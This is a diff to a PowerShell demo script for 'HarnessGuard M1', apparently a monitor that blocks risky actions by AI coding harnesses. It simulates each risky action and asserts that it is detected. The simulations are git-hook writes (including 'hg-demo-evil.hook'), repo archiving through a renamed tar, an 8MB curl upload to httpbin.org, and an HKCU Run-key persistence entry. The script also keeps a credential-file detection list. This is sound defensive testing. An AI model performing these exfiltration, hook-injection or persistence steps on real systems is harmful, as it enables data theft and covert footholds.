@@ -1,7 +1,14 @@
 ﻿# HarnessGuard M1 端到端演示（需管理员 PowerShell 运行）
-# 场景：A 读 .git 阻断；B evilpack(tar 副本) 命令封堵；C curl 上传 8MB 超 5MB 阈值断连接；
-#       D RunKey 持久化告警；E Web API 查证据。
-# 说明：全部场景使用系统自带工具（cmd/tar/curl）模拟 harness 子进程行为；
+# 场景：A  .git 注入面读（hooks）→ git-dir Block 判定 + 通知（默认不杀，拍板记录 12/13）；
+#       A2 树内真 git.exe status/commit → tool-exempt 豁免 + 工作流面放行（正向用例）；
+#       A3 绝对路径 git.exe（模拟便携/非标准安装）→ 豁免按文件名匹配（正向用例）；
+#       A4 harness 进程内直写 .git（模拟 isomorphic-git/nodegit 进程内库 IO 形态）
+#          → 工作流面放行；注入面写 Block 判定 + 不杀（存活标记验证）；
+#       B  evilpack(tar 副本) 命令封堵；B2 进程内创建归档产物（模拟 Node archiver 类库
+#          无子进程打包）→ archive-create Block + 杀（打包双信号之信号 2）；
+#       C  curl 上传 8MB 超 5MB 阈值断连接；D  RunKey 持久化告警；E  Web API 查证据。
+#       场景 A-B2/C/D 均带 PASS/FAIL 断言输出。
+# 说明：全部场景使用系统自带工具（cmd/tar/curl/git）模拟 harness 子进程行为；
 #       不使用编码命令或裸 TCP 写（避免触发杀软 ML 误报——实测教训）。
 # 复跑：powershell -ExecutionPolicy Bypass -File demos/m1-demo.ps1（产物在 target/demo/）
 
@@ -18,8 +25,22 @@ Start-Sleep 1
 Remove-Item -Recurse -Force $demo -ErrorAction SilentlyContinue
 New-Item -ItemType Directory -Force -Path "$demo\repo\.git" | Out-Null
 Set-Content "$demo\repo\.git\config" "[core]`nrepositoryformatversion = 0"
+# 注入面样本文件（hooks 下任意文件；git init 的 *.sample 同样适用，手工保证幂等）
+New-Item -ItemType Directory -Force -Path "$demo\repo\.git\hooks" | Out-Null
+Set-Content "$demo\repo\.git\hooks\pre-commit" "#!/bin/sh`ndemo-hook"
 Set-Content "$demo\repo\.env" "SECRET=demo-secret"
 Set-Content "$demo\repo\main.rs" "fn main() {}"
+# git 可用性（A2/A3 正向用例前置；无 git 环境则跳过并提示）
+$gitCmd = Get-Command git -ErrorAction SilentlyContinue
+$gitExe = if ($gitCmd) { $gitCmd.Source } elseif (Test-Path "C:\Program Files\Git\cmd\git.exe") { "C:\Program Files\Git\cmd\git.exe" } else { $null }
+if ($gitExe) {
+  # 仓库真 git 化（PowerShell 在监控树外，init 不产生判定）
+  & $gitExe -C "$demo\repo" init 2>&1 | Out-Null
+  & $gitExe -C "$demo\repo" config user.email "hg@demo.local" 2>&1 | Out-Null
+  & $gitExe -C "$demo\repo" config user.name "hg-demo" 2>&1 | Out-Null
+} else {
+  "[前置] 未找到 git.exe，跳过场景 A2/A3（正向豁免用例）"
+}
 # 8MB 全零载荷（fsutil 秒建；避免随机数据/大字符串拼接触发杀软或 PS 限制——实测教训）
 fsutil file createnew "$demo\big.bin" 8388608 | Out-Null
 Copy-Item "C:\Windows\System32\cmd.exe" "$demo\fake_harness.exe" -Force
@@ -36,6 +57,7 @@ allow = ["api.anthropic.com", "*.github.com"]
 
 [files]
 git_dir_action = "block"
+git_dir_kill = false
 archive_action = "block"
 sensitive_patterns = [".env", ".env.*", "*_rsa", "*.pem", "*credentials*"]
 archive_patterns = ["*.zip", "*.tar", "*.tar.gz", "*.tgz", "*.7z", "*.gz", "*.zst"]
@@ -77,12 +99,68 @@ if (-not $token) { "!! 服务未产出 token："; Get-Content "$demo\svc.out.log
 "服务已启动 token=$token"
 $H = @{ Authorization = "Bearer $token" }
 
-# ---------- 4. 场景 A：harness 树内读 .git → 阻断 + 杀 ----------
-"[场景 A] fake_harness(cmd) 用 type 读 repo\.git\config（期望：git-dir Block + 杀进程）"
+# ---------- 4. 场景 A：注入面读（hooks）→ Block 判定 + 通知（默认不杀） ----------
+"[场景 A] fake_harness(cmd) 读 repo\.git\hooks\pre-commit（期望：git-dir Block 判定 + 通知，默认不杀，拍板记录 12/13）"
 Push-Location $demo
-& "$demo\fake_harness.exe" /c "certutil -dump $demo\repo\.git\config" 2>&1 | Out-Null
+& "$demo\fake_harness.exe" /c "type repo\.git\hooks\pre-commit" 2>&1 | Out-Null
 Pop-Location
 Start-Sleep 2
+
+# 判定断言辅助：按 rule_id 统计 verdicts 总数（limit 200）
+function Get-RuleCount($h, $ruleId) {
+  try {
+    $vs = Invoke-RestMethod -Headers $h "http://127.0.0.1:8377/api/verdicts?limit=200"
+    return @($vs | Where-Object { $_.rule_id -eq $ruleId }).Count
+  } catch { return -1 }
+}
+$aBlocks = Get-RuleCount $H "git-dir"
+if ($aBlocks -ge 1) { "[断言 A] PASS：git-dir Block 判定 {0} 条" -f $aBlocks }
+else { "[断言 A] FAIL：未见 git-dir Block（注入面读未命中？）" }
+
+# ---------- 4a. 场景 A2：树内真 git.exe status/commit → 豁免 + 工作流面放行 ----------
+if ($gitExe) {
+  "[场景 A2] fake_harness 树内 git.exe add+commit（期望：无 git-dir Block，git-dir-workflow 首见放行，commit 成功——tool-exempt 正向用例）"
+  Push-Location $demo
+  & "$demo\fake_harness.exe" /c "git -C repo add main.rs & git -C repo commit -m hg-demo-commit" 2>&1 | Out-Null
+  Pop-Location
+  Start-Sleep 2
+  $a2Blocks = Get-RuleCount $H "git-dir"
+  if ($a2Blocks -eq $aBlocks) { "[断言 A2] PASS：git.exe 操作零新增 git-dir Block（{0} -> {1}）" -f $aBlocks, $a2Blocks }
+  else { "[断言 A2] FAIL：git.exe 操作新增 git-dir Block {0} 条（豁免/工作流面未生效？）" -f ($a2Blocks - $aBlocks) }
+  $a2Log = & $gitExe -C "$demo\repo" log --oneline -1 2>$null
+  if ($a2Log -match "hg-demo-commit") { "[断言 A2] PASS：commit 成功（$a2Log）" }
+  else { "[断言 A2] FAIL：commit 未落盘（$a2Log）" }
+} else { "[场景 A2] SKIP（无 git.exe）" }
+
+# ---------- 4b. 场景 A3：绝对路径 git.exe（便携/非标准安装形态）→ 按文件名豁免 ----------
+if ($gitExe) {
+  $absGit = $gitExe
+  "[场景 A3] fake_harness 树内绝对路径 git.exe（$absGit，期望：豁免按文件名匹配，无 git-dir Block）"
+  Push-Location $demo
+  & "$demo\fake_harness.exe" /c "`"$absGit`" -C repo status --porcelain" 2>&1 | Out-Null
+  Pop-Location
+  Start-Sleep 2
+  $a3Blocks = Get-RuleCount $H "git-dir"
+  if ($a3Blocks -eq $aBlocks) { "[断言 A3] PASS：绝对路径 git.exe 零新增 Block" }
+  else { "[断言 A3] FAIL：新增 {0} 条（mingw64/bin 等非 cmd 路径未豁免？）" -f ($a3Blocks - $aBlocks) }
+} else { "[场景 A3] SKIP（无 git.exe）" }
+
+# ---------- 4c. 场景 A4：进程内直写 .git（模拟 isomorphic-git/nodegit IO 形态） ----------
+"[场景 A4] fake_harness(cmd) 进程内直写 .git（期望：objects/HEAD.lock 工作流面放行；hooks 写 Block 判定 + 不杀——同进程存活标记验证）"
+Remove-Item "$demo\a4-alive.marker" -Force -ErrorAction SilentlyContinue
+Push-Location $demo
+# 工作流面：objects 写 + HEAD.lock 写（模拟进程内 git 库 commit 形态）
+New-Item -ItemType Directory -Force -Path "$demo\repo\.git\objects\ab" | Out-Null
+& "$demo\fake_harness.exe" /c "echo blob-demo > repo\.git\objects\ab\abcdef123456 & copy /y nul repo\.git\HEAD.lock > nul" 2>&1 | Out-Null
+# 注入面写 + 同进程存活标记（默认不杀：marker 应存在）
+& "$demo\fake_harness.exe" /c "echo evil-hook > repo\.git\hooks\hg-demo-evil.hook & echo alive > $demo\a4-alive.marker" 2>&1 | Out-Null
+Pop-Location
+Start-Sleep 2
+$a4Blocks = Get-RuleCount $H "git-dir"
+if ($a4Blocks -gt $aBlocks) { "[断言 A4] PASS：注入面写产生 Block 判定（+{0}）" -f ($a4Blocks - $aBlocks) }
+else { "[断言 A4] FAIL：注入面写未命中（{0} -> {1}）" -f $aBlocks, $a4Blocks }
+if (Test-Path "$demo\a4-alive.marker") { "[断言 A4] PASS：触碰注入面后进程存活（默认不杀，git_dir_kill=false）" }
+else { "[断言 A4] FAIL：进程被杀（git_dir_kill 应为 false——检查配置）" }
 
 # ---------- 5. 场景 B：evilpack(tar 副本) 命令封堵 + 杀 ----------
 "[场景 B] fake_harness 树内 evilpack.exe 打包 repo（期望：cmd-block Block + 杀进程）"
@@ -90,6 +168,19 @@ Push-Location $demo
 & "$demo\fake_harness.exe" /c "$demo\evilpack.exe -czf out.tar.gz repo" 2>&1 | Out-Null
 Pop-Location
 Start-Sleep 2
+$bCmd = Get-RuleCount $H "cmd-block"
+if ($bCmd -ge 1) { "[断言 B] PASS：cmd-block Block 判定 {0} 条" -f $bCmd }
+else { "[断言 B] FAIL：未见 cmd-block（命令封堵未命中？）" }
+
+# ---------- 5a. 场景 B2：进程内创建归档产物（无独立子进程，模拟 Node archiver 类库打包） ----------
+"[场景 B2] fake_harness(cmd) 进程内直接写 out2.zip（期望：archive-create Block + 杀进程——打包双信号之信号 2，需求 §3.1）"
+Push-Location $demo
+& "$demo\fake_harness.exe" /c "echo fake-zip-content > out2.zip" 2>&1 | Out-Null
+Pop-Location
+Start-Sleep 2
+$b2Arch = Get-RuleCount $H "archive-create"
+if ($b2Arch -ge 1) { "[断言 B2] PASS：archive-create Block 判定 {0} 条（进程内打包产物被捕获）" -f $b2Arch }
+else { "[断言 B2] FAIL：未见 archive-create（产物创建信号未生效？）" }
 
 # ---------- 6. 场景 C：树内 curl 上传 8MB（>5MB 阈值）→ 断连接 + 杀 ----------
 "[场景 C] fake_harness 树内 curl POST 8MB 到 httpbin.org（真实外部端点——本机自连/回环的大流量 send 均不产生 TCP-IP 事件，实测教训）（期望：net-threshold Block + 断连接 + 封目标 IP）"
@@ -97,11 +188,17 @@ Push-Location $demo
 & "$demo\fake_harness.exe" /c "curl -s -m 25 --data-binary @big.bin http://httpbin.org/post" 2>&1 | Out-Null
 Pop-Location
 Start-Sleep 3
+$cNet = Get-RuleCount $H "net-threshold"
+if ($cNet -ge 1) { "[断言 C] PASS：net-threshold Block 判定 {0} 条（断连接 + 封 IP 由 /api/status 与系统侧核对）" -f $cNet }
+else { "[断言 C] FAIL：未见 net-threshold（外传阈值未触发？检查外网连通性——httpbin.org 不可达时本场景依赖外部端点）" }
 
 # ---------- 7. 场景 D：RunKey 持久化（轮询 30s） ----------
 "[场景 D] 写入 HKCU RunKey（期望：persistence Audit 告警，~30s 内）"
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v HgDemo /d "cmd /c echo hi" /f | Out-Null
 Start-Sleep 35
+$dPers = Get-RuleCount $H "persistence"
+if ($dPers -ge 1) { "[断言 D] PASS：persistence Audit 告警 {0} 条" -f $dPers }
+else { "[断言 D] FAIL：未见 persistence（轮询窗口内未检出？）" }
 
 # ---------- 8. 场景 E：API 查证据 ----------
 "[场景 E] /api/status"
